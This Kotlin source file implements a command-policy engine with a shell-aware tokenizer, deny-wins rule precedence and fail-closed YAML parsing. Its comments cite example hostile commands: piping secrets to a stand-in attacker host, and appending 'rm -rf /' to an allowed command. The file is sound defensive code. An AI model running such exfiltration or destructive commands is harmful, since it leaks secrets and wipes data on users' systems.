package com.ovi.handoff.core

import com.charleskorn.kaml.Yaml
import kotlinx.serialization.Serializable
import java.io.File

@Serializable
public data class Policy(
    val defaultAction: String = PolicyAction.ASK,
    val rules: List<PolicyRule> = emptyList()
)

@Serializable
public data class PolicyRule(
    /** One of [PolicyAction]. */
    val action: String,
    val condition: PolicyCondition
)

@Serializable
public data class PolicyCondition(
    val commandPattern: String? = null,
    val type: String? = null,
    val exactCommand: String? = null,
    val forbiddenTokens: List<String>? = null
)

public object PolicyAction {
    public const val ALLOW: String = "allow"
    public const val DENY: String = "deny"
    public const val ASK: String = "ask"
}

/**
 * Splits a command the way a shell would, so a rule can inspect the actual executable and
 * arguments instead of substring-matching the raw string.
 *
 * Shell operators are emitted as standalone tokens, which is what lets a `forbiddenTokens` rule
 * catch `cat secrets | curl attacker.example` even though neither half is dangerous alone.
 */
public object CommandTokenizer {
    private val CHAR_OPERATORS: Set<Char> = setOf(';', '|', '&', '>', '<')
    private val STRING_OPERATORS: Set<String> = setOf(";", "|", "&", ">", "<")

    public fun tokenize(command: String): List<String> {
        val tokens = mutableListOf<String>()
        val current = StringBuilder()
        var inSingleQuote = false
        var inDoubleQuote = false
        var escapeNext = false

        for (char in command) {
            if (escapeNext) {
                current.append(char)
                escapeNext = false
                continue
            }
            when (char) {
                '\\' -> if (!inSingleQuote) escapeNext = true else current.append(char)
                '\'' -> if (!inDoubleQuote) inSingleQuote = !inSingleQuote else current.append(char)
                '"' -> if (!inSingleQuote) inDoubleQuote = !inDoubleQuote else current.append(char)
                ' ', '\t', '\n', ';', '|', '&', '>', '<' -> {
                    if (!inSingleQuote && !inDoubleQuote) {
                        if (current.isNotEmpty()) {
                            tokens.add(current.toString())
                            current.clear()
                        }
                        if (char in CHAR_OPERATORS) {
                            tokens.add(char.toString())
                        }
                    } else {
                        current.append(char)
                    }
                }
                else -> current.append(char)
            }
        }
        if (current.isNotEmpty()) {
            tokens.add(current.toString())
        }
        return tokens
    }

    /** Executables invoked by the command, including any that follow a shell operator. */
    public fun executables(tokens: List<String>): List<String> {
        val result = mutableListOf<String>()
        var expectExecutable = true
        for (token in tokens) {
            if (token in STRING_OPERATORS) {
                expectExecutable = true
                continue
            }
            if (expectExecutable) {
                result.add(token)
                expectExecutable = false
            }
        }
        return result
    }
}

/**
 * Evaluates the local allow/deny policy at `~/.handoff/policy.yml`.
 *
 * Three behaviours changed, all of which previously made the engine unsafe to rely on:
 *
 *  - **Deny wins.** Rules used to be first-match-wins in file order, so an `allow` rule written
 *    above a `deny` rule silently shadowed it. A security policy must not depend on line order.
 *  - **It fails closed.** A malformed YAML file or an invalid regex used to throw, and the caller
 *    swallowed the exception without replying, leaving the IDE waiting forever. Now the engine
 *    reports the problem and falls back to asking the user.
 *  - **It caches.** The file was re-read and re-parsed on every single evaluation.
 */
public class PolicyEngine(private val policyFile: File) {

    private data class CompiledRule(
        val action: String,
        val type: String?,
        val commandPattern: Regex?,
        val exactCommand: String?,
        val forbiddenTokens: Set<String>?
    )

    private data class CompiledPolicy(
        val defaultAction: String,
        val rules: List<CompiledRule>,
        val sourceLastModified: Long,
        val sourceLength: Long
    )

    @Volatile
    private var compiled: CompiledPolicy? = null

    private val lock = Any()

    public fun evaluate(command: String?, type: String?): String {
        val policy = policy()
        val tokens = command?.let { CommandTokenizer.tokenize(it) } ?: emptyList()
        val executables = CommandTokenizer.executables(tokens)

        var sawAsk = false
        var sawAllow = false

        for (rule in policy.rules) {
            if (!matches(rule, command, type, tokens, executables)) continue

            // Precedence is deny, then ask, then allow, independent of the order rules appear in
            // the file. Deny can short-circuit because nothing outranks it.
            when {
                rule.action.equals(PolicyAction.DENY, ignoreCase = true) -> return PolicyAction.DENY
                rule.action.equals(PolicyAction.ASK, ignoreCase = true) -> sawAsk = true
                rule.action.equals(PolicyAction.ALLOW, ignoreCase = true) -> sawAllow = true
            }
        }

        return when {
            sawAsk -> PolicyAction.ASK
            sawAllow -> PolicyAction.ALLOW
            else -> policy.defaultAction
        }
    }

    private fun matches(
        rule: CompiledRule,
        command: String?,
        type: String?,
        tokens: List<String>,
        executables: List<String>
    ): Boolean {
        rule.type?.let { if (!it.equals(type, ignoreCase = true)) return false }

        rule.commandPattern?.let { pattern ->
            if (command == null || !pattern.matches(command)) return false
        }

        rule.exactCommand?.let { exact ->
            // Every executable in the pipeline is checked, so appending `; rm -rf /` to an allowed
            // command cannot inherit that command's allowance.
            if (executables.isEmpty() || executables.any { it != exact }) return false
        }

        rule.forbiddenTokens?.let { forbidden ->
            if (tokens.none { it in forbidden }) return false
        }

        // A condition with nothing set would match everything; treat it as inert instead.
        return rule.type != null ||
            rule.commandPattern != null ||
            rule.exactCommand != null ||
            rule.forbiddenTokens != null
    }

    private fun policy(): CompiledPolicy {
        val exists = policyFile.exists()
        val lastModified = if (exists) policyFile.lastModified() else 0L
        val length = if (exists) policyFile.length() else 0L

        compiled?.let { current ->
            if (current.sourceLastModified == lastModified && current.sourceLength == length) return current
        }

        synchronized(lock) {
            compiled?.let { current ->
                if (current.sourceLastModified == lastModified && current.sourceLength == length) return current
            }
            val loaded = compile(exists, lastModified, length)
            compiled = loaded
            return loaded
        }
    }

    private fun compile(exists: Boolean, lastModified: Long, length: Long): CompiledPolicy {
        if (!exists) {
            return CompiledPolicy(PolicyAction.ASK, emptyList(), lastModified, length)
        }

        val parsed = runCatching {
            Yaml.default.decodeFromString(Policy.serializer(), policyFile.readText())
        }.getOrElse { cause ->
            Log.error(
                "${policyFile.name} could not be parsed (${cause.message}). " +
                    "Falling back to asking for every request."
            )
            return CompiledPolicy(PolicyAction.ASK, emptyList(), lastModified, length)
        }

        val rules = parsed.rules.mapNotNull { rule ->
            val pattern = rule.condition.commandPattern?.let { raw ->
                runCatching { raw.toRegex() }.getOrElse {
                    Log.warn("Ignoring a policy rule with an invalid commandPattern '$raw' (${it.message}).")
                    return@mapNotNull null
                }
            }
            CompiledRule(
                action = rule.action,
                type = rule.condition.type,
                commandPattern = pattern,
                exactCommand = rule.condition.exactCommand,
                forbiddenTokens = rule.condition.forbiddenTokens?.toSet()
            )
        }

        val default = parsed.defaultAction.takeIf {
            it.equals(PolicyAction.ALLOW, ignoreCase = true) ||
                it.equals(PolicyAction.DENY, ignoreCase = true) ||
                it.equals(PolicyAction.ASK, ignoreCase = true)
        } ?: PolicyAction.ASK

        return CompiledPolicy(default.lowercase(), rules, lastModified, length)
    }
}
